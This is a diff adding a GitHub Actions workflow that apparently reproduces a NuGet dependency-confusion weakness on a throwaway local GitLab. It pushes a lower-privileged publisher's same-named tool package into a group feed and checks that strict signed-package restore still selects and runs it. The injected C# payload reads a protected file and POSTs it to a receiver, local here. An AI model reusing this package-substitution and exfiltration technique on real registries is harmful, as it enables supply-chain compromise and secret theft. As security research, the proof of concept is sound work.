@@ -1,0 +1,486 @@
+name: Owned NuGet group policy consequence probe
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - pa30-rank23-l108-gitlab-split-20261128
+
+permissions:
+  contents: read
+
+jobs:
+  policy-consequence:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 50
+    steps:
+      - name: Check isolated runner capacity
+        shell: bash
+        run: |
+          set -euo pipefail
+          df -h /
+          free -h
+          available_kib=$(df --output=avail -k / | tail -n 1)
+          test "$available_kib" -ge 9000000
+
+      - name: Install supported .NET SDK
+        uses: actions/setup-dotnet@v5
+        with:
+          dotnet-version: 11.0.100
+
+      - name: Start ephemeral GitLab CE 19.6.2
+        shell: bash
+        run: |
+          set -euo pipefail
+          root_password=$(openssl rand -hex 24)
+          echo "::add-mask::$root_password"
+          docker run --detach --rm --name l108-owned-gitlab \
+            --shm-size 512m \
+            --publish 127.0.0.1:8929:8929 \
+            --env GITLAB_ROOT_PASSWORD="$root_password" \
+            --env GITLAB_OMNIBUS_CONFIG="external_url 'http://127.0.0.1:8929'; prometheus_monitoring['enable'] = false;" \
+            gitlab/gitlab-ce:19.6.2-ce.0 >/dev/null
+          ready=0
+          for attempt in $(seq 1 120); do
+            if curl --silent --fail --output /dev/null \
+              http://127.0.0.1:8929/users/sign_in; then
+              ready=1
+              break
+            fi
+            if ! docker inspect --format '{{.State.Running}}' l108-owned-gitlab | grep -qx true; then
+              echo "GitLab container stopped before readiness"
+              exit 1
+            fi
+            sleep 10
+          done
+          test "$ready" -eq 1
+          docker exec l108-owned-gitlab gitlab-rails runner \
+            "s=SecureRandom.alphanumeric(20); t=User.find_by_username('root').personal_access_tokens.create!(scopes: ['api'], name: 'l108-ephemeral-root', expires_at: 2.days.from_now); t.set_token(s); t.save!; File.write('/tmp/l108-root-token', s)" >/dev/null
+          docker cp l108-owned-gitlab:/tmp/l108-root-token "$RUNNER_TEMP/l108-root-token" >/dev/null
+          chmod 600 "$RUNNER_TEMP/l108-root-token"
+          echo "Ephemeral GitLab is ready; admin token retained only on this runner."
+
+      - name: Test sibling publisher, signed policy, and protected consequence
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import datetime
+          import base64
+          import hashlib
+          import json
+          import os
+          import pathlib
+          import re
+          import secrets
+          import shutil
+          import subprocess
+          import threading
+          import urllib.error
+          import urllib.request
+          from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+          from xml.sax.saxutils import escape
+
+          base = "http://127.0.0.1:8929"
+          temp = pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-probe"
+          temp.mkdir(mode=0o700, exist_ok=True)
+          root_token = (pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-root-token").read_text().strip()
+          print("::add-mask::" + root_token)
+          summary = {"gitlab_image": "gitlab/gitlab-ce:19.6.2-ce.0",
+                     "sdk": subprocess.check_output(["dotnet", "--version"], text=True).strip(),
+                     "controls": []}
+
+          protected_bytes = b"INERT_OWNED_L108_" + secrets.token_bytes(24)
+          protected_file = temp / "victim-only"
+          protected_file.write_bytes(protected_bytes)
+          protected_file.chmod(0o600)
+          received = []
+          class Receiver(BaseHTTPRequestHandler):
+              def do_POST(self):
+                  body = self.rfile.read(int(self.headers.get("Content-Length", "0")))
+                  received.append(body)
+                  self.send_response(204)
+                  self.end_headers()
+              def log_message(self, *_):
+                  pass
+          receiver = ThreadingHTTPServer(("127.0.0.1", 0), Receiver)
+          threading.Thread(target=receiver.serve_forever, daemon=True).start()
+          callback = f"http://127.0.0.1:{receiver.server_port}/owned-receiver"
+          summary["protected_file"] = {"mode": oct(protected_file.stat().st_mode & 0o777),
+                                       "sha256": hashlib.sha256(protected_bytes).hexdigest()}
+
+          def request(method, path, data=None, token=None, basic=None):
+              headers = {}
+              if token:
+                  headers["PRIVATE-TOKEN"] = token
+              if basic:
+                  headers["Authorization"] = "Basic " + base64.b64encode(
+                      (basic[0] + ":" + basic[1]).encode()).decode()
+              body = None
+              if data is not None:
+                  headers["Content-Type"] = "application/json"
+                  body = json.dumps(data).encode()
+              req = urllib.request.Request(base + path, data=body, headers=headers, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=60) as response:
+                      raw = response.read()
+                      try:
+                          return response.status, json.loads(raw)
+                      except json.JSONDecodeError:
+                          return response.status, raw.decode(errors="replace")
+              except urllib.error.HTTPError as error:
+                  return error.code, error.read().decode(errors="replace")
+
+          def must(method, path, data=None, token=None, status=201):
+              code, value = request(method, path, data, token)
+              if code != status:
+                  raise RuntimeError(f"{method} {path}: HTTP {code}; {str(value)[:350]}")
+              return value
+
+          suffix = os.environ["GITHUB_RUN_ID"]
+          group = must("POST", "/api/v4/groups",
+                       {"name": "Owned registry split " + suffix,
+                        "path": "l108-owned-" + suffix, "visibility": "private"},
+                       root_token)
+          gid = group["id"]
+          a = must("POST", "/api/v4/projects",
+                   {"name": "trusted-a", "path": "trusted-a",
+                    "namespace_id": gid, "visibility": "private"}, root_token)
+          b = must("POST", "/api/v4/projects",
+                   {"name": "lower-b", "path": "lower-b",
+                    "namespace_id": gid, "visibility": "private"}, root_token)
+          users = {}
+          for role in ("publisher", "reader"):
+              user = must("POST", "/api/v4/users",
+                          {"username": "l108" + role + suffix,
+                           "name": "Owned " + role,
+                           "email": "l108" + role + suffix + "@example.invalid",
+                           "password": secrets.token_urlsafe(32),
+                           "skip_confirmation": True},
+                          root_token)
+              users[role] = user
+          must("POST", f"/api/v4/projects/{b['id']}/members",
+               {"user_id": users["publisher"]["id"], "access_level": 30}, root_token)
+          must("POST", f"/api/v4/groups/{gid}/members",
+               {"user_id": users["reader"]["id"], "access_level": 20}, root_token)
+          tokens = {}
+          for role, user in users.items():
+              token_result = must(
+                  "POST", f"/api/v4/users/{user['id']}/personal_access_tokens",
+                  {"name": "l108-ephemeral-" + role, "scopes": ["api"],
+                   "expires_at": (datetime.date.today() + datetime.timedelta(days=1)).isoformat()},
+                  root_token)
+              tokens[role] = token_result["token"]
+              print("::add-mask::" + tokens[role])
+          summary["group_id"] = gid
+          summary["projects"] = {"trusted_a": a["id"], "lower_b": b["id"]}
+          summary["roles"] = {"publisher": "Developer on B only",
+                              "reader": "Reporter on group"}
+
+          denied_file = subprocess.run(
+              ["sudo", "-u", "nobody", "cat", str(protected_file)],
+              capture_output=True, timeout=15)
+          summary["controls"].append({"case": "lower_os_read_protected_file",
+                                      "exit": denied_file.returncode})
+          if denied_file.returncode == 0:
+              raise RuntimeError("Lower OS identity read protected file")
+
+          denied_get, _ = request("GET", f"/api/v4/projects/{a['id']}",
+                                  token=tokens["publisher"])
+          summary["controls"].append({"case": "publisher_get_trusted_a", "http": denied_get})
+          if denied_get not in (403, 404):
+              raise RuntimeError("Publisher unexpectedly reads trusted A project")
+          reader_get, _ = request("GET", f"/api/v4/projects/{a['id']}",
+                                  token=tokens["reader"])
+          summary["controls"].append({"case": "reader_get_trusted_a", "http": reader_get})
+          if reader_get != 200:
+              raise RuntimeError("Reader cannot access trusted A project")
+          basic_index, _ = request(
+              "GET", f"/api/v4/groups/{gid}/-/packages/nuget/index.json",
+              basic=(users["reader"]["username"], tokens["reader"]))
+          summary["controls"].append({"case": "reader_basic_group_index", "http": basic_index})
+          if basic_index != 200:
+              raise RuntimeError(f"Reader Basic auth failed on group index: {basic_index}")
+
+          def make_package(series, marker):
+              package_id = f"Owned.RegistryProbe.{suffix}.{series}"
+              command = "ownedprobe" + series.lower()
+              directory = temp / "source" / series / marker
+              directory.mkdir(parents=True, exist_ok=True)
+              project = directory / "Probe.csproj"
+              project.write_text(
+                  '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup>'
+                  '<TargetFramework>net11.0</TargetFramework><OutputType>Exe</OutputType>'
+                  '<PackAsTool>true</PackAsTool><ToolCommandName>' + command + '</ToolCommandName>'
+                  '<PackageId>' + package_id + '</PackageId><Version>1.0.0</Version>'
+                  '<Authors>OwnedLab</Authors></PropertyGroup></Project>')
+              program = 'System.Console.WriteLine("OWNED_' + marker + '");'
+              if series.startswith("Impact") and marker == "B":
+                  program = (
+                      'using System.Net.Http; '
+                      'var path = System.Environment.GetEnvironmentVariable("L108_PROTECTED_PATH"); '
+                      'var url = System.Environment.GetEnvironmentVariable("L108_OWNED_RECEIVER"); '
+                      'if (path != null && url != null) { '
+                      'using var client = new HttpClient(); '
+                      'var response = client.PostAsync(url, '
+                      'new ByteArrayContent(System.IO.File.ReadAllBytes(path))).GetAwaiter().GetResult(); '
+                      'response.EnsureSuccessStatusCode(); } '
+                      'System.Console.WriteLine("OWNED_B");')
+              (directory / "Program.cs").write_text(program)
+              output = temp / "built" / series / marker
+              output.mkdir(parents=True, exist_ok=True)
+              result = subprocess.run(
+                  ["dotnet", "pack", str(project), "-c", "Release", "-o", str(output),
+                   "--nologo", "--verbosity", "quiet"],
+                  capture_output=True, text=True, timeout=180)
+              if result.returncode:
+                  raise RuntimeError("dotnet pack failed: " + (result.stdout + result.stderr)[-700:])
+              package = next(output.glob("*.nupkg"))
+              return package_id, command, package
+
+          packages = {}
+          for series in ("Primary", "Reverse", "Impact", "ImpactReverse"):
+              for marker in ("A", "B"):
+                  packages[(series, marker)] = make_package(series, marker)
+
+          certificate_dir = temp / "signing"
+          certificate_dir.mkdir()
+          certificate = certificate_dir / "author.pem"
+          key = certificate_dir / "author.key"
+          pfx = certificate_dir / "author.pfx"
+          pfx_password = secrets.token_urlsafe(32)
+          subprocess.run(
+              ["openssl", "req", "-x509", "-newkey", "rsa:3072", "-sha256",
+               "-nodes", "-keyout", str(key), "-out", str(certificate),
+               "-days", "2", "-subj", "/CN=Owned-L108-Author"],
+              check=True, capture_output=True, timeout=60)
+          subprocess.run(
+              ["openssl", "pkcs12", "-export", "-out", str(pfx),
+               "-inkey", str(key), "-in", str(certificate),
+               "-passout", "pass:" + pfx_password],
+              check=True, capture_output=True, timeout=30)
+          cert_der = subprocess.check_output(
+              ["openssl", "x509", "-in", str(certificate), "-outform", "DER"])
+          certificate_fingerprint = hashlib.sha256(cert_der).hexdigest().upper()
+          summary["author_certificate_sha256"] = certificate_fingerprint
+          signer_xml = (
+              '<config><add key="signatureValidationMode" value="require"/></config>'
+              '<trustedSigners><author name="OwnedL108Author"><certificate fingerprint="' +
+              certificate_fingerprint +
+              '" hashAlgorithm="SHA256" allowUntrustedRoot="true"/></author></trustedSigners>')
+          for series in ("Impact", "ImpactReverse"):
+              package = packages[(series, "A")][2]
+              signed = subprocess.run(
+                  ["dotnet", "nuget", "sign", str(package),
+                   "--certificate-path", str(pfx),
+                   "--certificate-password", pfx_password,
+                   "--allow-untrusted-root", "--overwrite", "--verbosity", "quiet"],
+                  capture_output=True, text=True, timeout=120)
+              if signed.returncode:
+                  raise RuntimeError("Owned A signing failed: " +
+                                     (signed.stdout + signed.stderr).replace(pfx_password, "[masked]")[-600:])
+          verification_config = temp / "signed-policy.config"
+          verification_config.write_text(
+              '<?xml version="1.0"?><configuration><packageSources><clear/></packageSources>' +
+              signer_xml + '</configuration>')
+          for marker in ("A", "B"):
+              package = packages[("Impact", marker)][2]
+              checked = subprocess.run(
+                  ["dotnet", "nuget", "verify", "--all", str(package),
+                   "--configfile", str(verification_config)],
+                  capture_output=True, text=True, timeout=120)
+              output = checked.stdout + checked.stderr
+              summary["controls"].append(
+                  {"case": "direct_verify_impact_" + marker, "exit": checked.returncode,
+                   "nu3004": "NU3004" in output, "nu3008": "NU3008" in output,
+                   "package_sha256": hashlib.sha256(package.read_bytes()).hexdigest()})
+              if (marker == "A" and checked.returncode != 0) or (
+                      marker == "B" and (checked.returncode == 0 or "NU3004" not in output)):
+                  raise RuntimeError("Direct signing control failed for " + marker +
+                                     ": " + output[-700:])
+
+          def package_hash(package):
+              return hashlib.sha256(package.read_bytes()).hexdigest()
+
+          def push(series, marker, project_id, token, expect_success=True,
+                   lower_os=False):
+              package = packages[(series, marker)][2]
+              source = f"{base}/api/v4/projects/{project_id}/packages/nuget/index.json"
+              package_for_push = package
+              if lower_os:
+                  package_for_push = pathlib.Path("/tmp") / (
+                      "l108-owned-" + suffix + "-" + series.lower() + "-" +
+                      marker.lower() + ".nupkg")
+                  shutil.copyfile(package, package_for_push)
+                  package_for_push.chmod(0o644)
+              cmd = [shutil.which("dotnet"), "nuget", "push", str(package_for_push),
+                     "--source", source, "--api-key", token,
+                     "--allow-insecure-connections", "--no-symbols", "--force-english-output"]
+              if lower_os:
+                  lower_home = pathlib.Path("/tmp") / ("l108-publisher-" + suffix)
+                  cmd = ["sudo", "-u", "nobody", "env",
+                         "HOME=" + str(lower_home),
+                         "DOTNET_CLI_HOME=" + str(lower_home),
+                         "DOTNET_CLI_TELEMETRY_OPTOUT=1",
+                         "DOTNET_SKIP_FIRST_TIME_EXPERIENCE=1"] + cmd
+              result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+              summary["controls"].append(
+                  {"case": f"push_{series}_{marker}_to_{project_id}",
+                   "exit": result.returncode,
+                   "lower_os": lower_os,
+                   "package_sha256": package_hash(package)})
+              if (result.returncode == 0) != expect_success:
+                  output = (result.stdout + result.stderr).replace(token, "[masked]")
+                  raise RuntimeError("Unexpected push result: " + output[-800:])
+
+          def restore(series, case, expected_marker, expected_package, password=None,
+                      strict=False, invoke=True, exfil=False):
+              package_id, command, _ = packages[(series, "A")]
+              directory = temp / "consumers" / case
+              directory.mkdir(parents=True, exist_ok=True)
+              (directory / ".config").mkdir(exist_ok=True)
+              manifest = {"version": 1, "isRoot": True,
+                          "tools": {package_id.lower(): {"version": "1.0.0",
+                                                         "commands": [command]}}}
+              (directory / ".config" / "dotnet-tools.json").write_text(json.dumps(manifest))
+              if password is None:
+                  password = tokens["reader"]
+              config = directory / "NuGet.Config"
+              config.write_text(
+                  '<?xml version="1.0"?><configuration><packageSources><clear/>'
+                  '<add key="ownedgroup" value="' + base + f'/api/v4/groups/{gid}/-/packages/nuget/index.json" '
+                  'protocolVersion="3" allowInsecureConnections="true"/></packageSources>'
+                  '<packageSourceCredentials><ownedgroup><add key="Username" value="' +
+                  users["reader"]["username"] + '"/>'
+                  '<add key="ClearTextPassword" value="' + escape(password) +
+                  '"/></ownedgroup></packageSourceCredentials>' +
+                  (signer_xml if strict else '') + '</configuration>')
+              os.chmod(config, 0o600)
+              env = os.environ.copy()
+              env["DOTNET_CLI_HOME"] = str(directory / "cli-home")
+              env["NUGET_PACKAGES"] = str(directory / "packages")
+              env["NUGET_HTTP_CACHE_PATH"] = str(directory / "http-cache")
+              env["DOTNET_NOLOGO"] = "1"
+              env["DOTNET_CLI_TELEMETRY_OPTOUT"] = "1"
+              command_line = ["dotnet", "tool", "restore",
+                              "--tool-manifest", str(directory / ".config" / "dotnet-tools.json"),
+                              "--configfile", str(config), "--no-cache", "--verbosity", "minimal"]
+              result = subprocess.run(command_line, cwd=directory, env=env,
+                                      capture_output=True, text=True, timeout=180)
+              if expected_marker is None:
+                  summary["controls"].append({"case": case, "restore_exit": result.returncode})
+                  if result.returncode == 0:
+                      raise RuntimeError("Wrong-credential restore unexpectedly succeeded")
+                  return
+              if result.returncode:
+                  output = (result.stdout + result.stderr).replace(password, "[masked]")
+                  raise RuntimeError("Restore failed: " + output[-800:])
+              post_before = len(received)
+              if exfil:
+                  env["L108_PROTECTED_PATH"] = str(protected_file)
+                  env["L108_OWNED_RECEIVER"] = callback
+              run = (subprocess.run(["dotnet", "tool", "run", command],
+                                    cwd=directory, env=env, capture_output=True,
+                                    text=True, timeout=90) if invoke else None)
+              stored = list((directory / "packages").rglob("*.nupkg"))
+              stored_entries = sorted(
+                  [{"path": str(p.relative_to(directory)), "sha256": package_hash(p)}
+                   for p in stored], key=lambda x: x["path"])
+              if (run is not None and run.returncode) or not stored:
+                  exit_code = run.returncode if run else None
+                  raise RuntimeError(f"Invocation or archive storage failed: {exit_code}, {len(stored)}")
+              marker = run.stdout.strip() if run else None
+              expected_hash = package_hash(packages[(series, expected_package)][2])
+              summary["controls"].append(
+                  {"case": case, "restore_exit": result.returncode,
+                   "invoke_exit": run.returncode if run else None, "output": marker,
+                   "strict": strict, "explicit_invoke": invoke,
+                   "post_count_before": post_before, "post_count_after": len(received),
+                   "stored_archives": stored_entries, "expected_sha256": expected_hash})
+              if ((invoke and marker != "OWNED_" + expected_marker) or
+                      expected_hash not in [x["sha256"] for x in stored_entries]):
+                  raise RuntimeError(f"{case}: wrong selected package")
+              expected_posts = post_before + (1 if exfil and invoke else 0)
+              if len(received) != expected_posts:
+                  raise RuntimeError(f"{case}: unexpected protected POST count")
+              if exfil and invoke and received[-1] != protected_bytes:
+                  raise RuntimeError(f"{case}: protected POST body mismatch")
+              return directory, env
+
+          try:
+              push("Primary", "A", a["id"], root_token)
+              restore("Primary", "primary_a_only", "A", "A")
+              restore("Primary", "wrong_reader_credential", None, "A",
+                      password="invalid-l108-owned-token")
+              push("Primary", "B", a["id"], tokens["publisher"], expect_success=False)
+              push("Primary", "B", b["id"], tokens["publisher"])
+              restore("Primary", "primary_b_newer", "B", "B")
+              restore("Primary", "primary_b_repeat", "B", "B")
+              push("Reverse", "B", b["id"], tokens["publisher"])
+              restore("Reverse", "reverse_b_only", "B", "B")
+              push("Reverse", "A", a["id"], root_token)
+              restore("Reverse", "reverse_a_newer", "A", "A")
+
+              index_code, index = request(
+                  "GET", f"/api/v4/groups/{gid}/-/packages/nuget/index.json",
+                  token=tokens["reader"])
+              summary["group_index_http"] = index_code
+              if index_code == 200:
+                  summary["index_resource_types"] = sorted(
+                      str(x.get("@type")) for x in index.get("resources", []))
+                  if any("RepositorySignatures" in value
+                         for value in summary["index_resource_types"]):
+                      raise RuntimeError("Group feed unexpectedly advertises RepositorySignatures")
+              else:
+                  raise RuntimeError("Reader cannot retrieve group service index")
+
+              push("Impact", "A", a["id"], root_token)
+              restore("Impact", "signed_a_only", "A", "A", strict=True)
+              push("Impact", "B", a["id"], tokens["publisher"],
+                   expect_success=False, lower_os=True)
+              push("Impact", "B", b["id"], tokens["publisher"], lower_os=True)
+              restore("Impact", "unsigned_b_restore_only", "B", "B",
+                      strict=True, invoke=False)
+              restore("Impact", "unsigned_b_protected_post", "B", "B",
+                      strict=True, exfil=True)
+              restore("Impact", "unsigned_b_protected_repeat", "B", "B",
+                      strict=True, exfil=True)
+              push("ImpactReverse", "B", b["id"], tokens["publisher"],
+                   lower_os=True)
+              restore("ImpactReverse", "reverse_unsigned_b_restore_only", "B", "B",
+                      strict=True, invoke=False)
+              push("ImpactReverse", "A", a["id"], root_token)
+              restore("ImpactReverse", "reverse_signed_a_selected", "A", "A",
+                      strict=True)
+              summary["protected_post_count"] = len(received)
+              summary["all_protected_posts_match"] = all(
+                  body == protected_bytes for body in received)
+              if len(received) != 2 or not summary["all_protected_posts_match"]:
+                  raise RuntimeError("Unexpected final protected POST state")
+          except Exception as error:
+              redacted = str(error)
+              for secret in [root_token, *tokens.values()]:
+                  redacted = redacted.replace(secret, "[masked]")
+              summary["error"] = redacted[:800]
+              raise
+          finally:
+              receiver.shutdown()
+              out = pathlib.Path("l108-result.json")
+              out.write_text(json.dumps(summary, indent=2) + "\n")
+              print("RESULT_SUMMARY=" + json.dumps(summary, separators=(",", ":")))
+          PY
+
+      - name: Upload redacted registry result
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: owned-nuget-policy-consequence-result
+          path: l108-result.json
+          if-no-files-found: ignore
+
+      - name: Stop ephemeral GitLab
+        if: always()
+        shell: bash
+        run: |
+          docker rm --force l108-owned-gitlab >/dev/null 2>&1 || true
+          rm -f "$RUNNER_TEMP/l108-root-token"
